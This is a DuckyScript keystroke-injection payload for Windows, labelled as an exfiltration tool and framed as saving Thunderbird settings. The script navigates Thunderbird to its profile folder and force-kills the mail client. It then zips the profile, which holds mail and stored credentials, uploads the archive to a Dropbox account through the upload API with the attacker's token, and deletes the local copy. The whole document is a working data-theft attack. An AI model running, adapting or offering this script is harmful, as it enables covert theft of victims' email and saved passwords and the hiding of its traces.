REM ##############################################################
REM #                                                            #
REM # Title       : Save Your Thunderbird Settings via Dropbox   #
REM # Author      : Aleff                                        #
REM # Version	  : 1.0                                          #
REM # Category	  : Exfiltration                                 #
REM # Target	  : Windows 10/11                                #
REM #                                                            #
REM ##############################################################

REM Required: Set here your Dropbox access TOKEN
DEFINE #ACCESS_TOKEN example-access-token
DEFINE #ARCHIVE_NAME cache.zip
DEFINE #DROPBOX_FOLDER_PATH /
DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
STRING thunderbird
ENTER
DELAY 1000
REPEAT 4 TAB
DELAY 500
ENTER
DELAY 500
REPEAT 2 UPARROW
DELAY 500
ENTER
DELAY 500
REPEAT 3 UPARROW
DELAY 500
ENTER
DELAY 500

REM Inside the settings
REPEAT 11 TAB
DELAY 500
ENTER
DELAY 500

REM INSIDE THE PROFILE FOLDER
REPEAT 4 TAB
DELAY 500
ENTER
DELAY 500
CTRL c
DELAY 500
ALT F4
DELAY 500
GUI r
STRING powershell
ENTER
DELAY 1500

STRINGLN cd $env:TEMP
DELAY 500
STRINGLN Stop-Process -Name "thunderbird" -Force
DELAY 500
STRING Compress-Archive -LiteralPath 
DELAY 500
CTRL v
DELAY 500
STRINGLN  -DestinationPath ./#ARCHIVE_NAME
DELAY 1000

STRINGLN_POWERSHELL
    $filePath = "$env:TEMP/#ARCHIVE_NAME"
    $filePath = $filePath -replace "\\", "/"
    $dropboxPath = "#DROPBOX_FOLDER_PATH#ARCHIVE_NAME"
    $accessToken = "#ACCESS_TOKEN"
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
        "Content-Type" = "application/octet-stream"
    }
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
END_STRINGLN
